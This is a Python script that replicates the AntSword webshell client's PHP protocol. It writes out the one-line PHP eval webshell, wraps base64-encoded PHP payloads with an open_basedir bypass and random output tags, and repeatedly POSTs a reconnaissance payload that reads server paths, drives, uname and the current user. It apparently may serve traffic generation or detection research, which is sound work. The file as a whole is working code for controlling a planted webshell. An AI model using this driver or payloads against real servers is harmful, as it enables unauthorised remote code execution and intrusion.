#!/usr/bin/env python3
"""AntSword (蚁剑) PHP protocol driver.

Replicates the official antSword v2.1.16 core (source/core/php) for the
default encoder (php::base64):

  shell:   <?php @eval($_POST['<pwd>']); ?>
  request: POST body
             <pwd>     = @eval(@base64_decode($_POST['<randomID>']));
             <randomID> = base64( php_code )
  where php_code is the compacted PHP template + the requested operation
  (e.g. basic info), wrapped with asoutput() and random hex data tags.
  response: <tag_s><output><tag_e>
"""

import base64
import random
import string
import sys
import time
import urllib.parse
import urllib.request


INFO_CODE = (
    '$D=dirname($_SERVER["SCRIPT_FILENAME"]);'
    'if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);'
    '$R="{$D}\\t";'
    'if(substr($D,0,1)!="/"){'
    'foreach(range("C","Z")as$L)if(is_dir("{$L}:"))$R.="{$L}:";'
    '}else{$R.="/";}'
    '$R.="\\t";'
    '$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";'
    '$s=($u)?$u["name"]:@get_current_user();'
    '$R.=php_uname();'
    '$R.="\\t{$s}";'
    'echo $R;'
)


def rand_hex(n=8):
    return "".join(random.choice(string.hexdigits[:16]) for _ in range(n))


def build_code(op_code: str) -> str:
    tag_s = rand_hex(random.randint(5, 12))
    tag_e = rand_hex(random.randint(5, 12))
    opdir = ".".join(["d", "tmp", "x"]) + rand_hex(4)
    bypass = (
        '$opdir=@ini_get("open_basedir");'
        'if($opdir){$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);'
        '$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);'
        '@array_push($oparr,$ocwd,sys_get_temp_dir());'
        'foreach($oparr as$item){if(!@is_writable($item)){continue;};'
        f'$tmdir=$item."/.{opdir}";@mkdir($tmdir);'
        'if(!@file_exists($tmdir)){continue;}'
        '$tmdir=realpath($tmdir);@chdir($tmdir);'
        '@ini_set("open_basedir","..");'
        '$cntarr=@preg_split("/\\\\\\\\|\\//",$tmdir);'
        'for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};'
        '@ini_set("open_basedir","/");@rmdir($tmdir);break;};};'
    )
    asenc = "function asenc($out){return $out;}"
    return (
        '@ini_set("display_errors", "0");@set_time_limit(0);'
        'if(!function_exists("get_magic_quotes_gpc")){'
        'function get_magic_quotes_gpc(){return 0;}};'
        f"{bypass};{asenc};"
        f'function asoutput(){{$output=ob_get_contents();ob_end_clean();'
        f'echo "{tag_s[:len(tag_s)//2]}"."{tag_s[len(tag_s)//2:]}";'
        f'echo @asenc($output);'
        f'echo "{tag_e[:len(tag_e)//2]}"."{tag_e[len(tag_e)//2:]}";}}'
        f"ob_start();try{{{op_code};}}catch(Exception $e)"
        f'{{echo "ERROR://".$e->getMessage();}};asoutput();die();'
    )


def post(url: str, pwd: str, op_code: str):
    random_id = "".join(random.choice(string.ascii_lowercase) for _ in range(4)) + rand_hex(8)
    code = build_code(op_code)
    b64 = base64.b64encode(code.encode()).decode()
    body = urllib.parse.urlencode({
        pwd: f"@eval(@base64_decode($_POST['{random_id}']));",
        random_id: b64,
    })
    req = urllib.request.Request(
        url,
        data=body.encode(),
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/91.0.4472.124 Safari/537.36",
        },
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        return resp.read()


def main():
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/shell.php"
    pwd = sys.argv[2] if len(sys.argv) > 2 else "ant"
    ops = int(sys.argv[3]) if len(sys.argv) > 3 else 4
    pause = float(sys.argv[4]) if len(sys.argv) > 4 else 2.0

    for i in range(ops):
        resp = post(url, pwd, INFO_CODE)
        # strip the random tags
        text = resp.decode(errors="ignore")
        print(f"op={i} resp_len={len(resp)} body_head={text[:80]!r}", file=sys.stderr)
        time.sleep(pause)


if __name__ == "__main__":
    main()
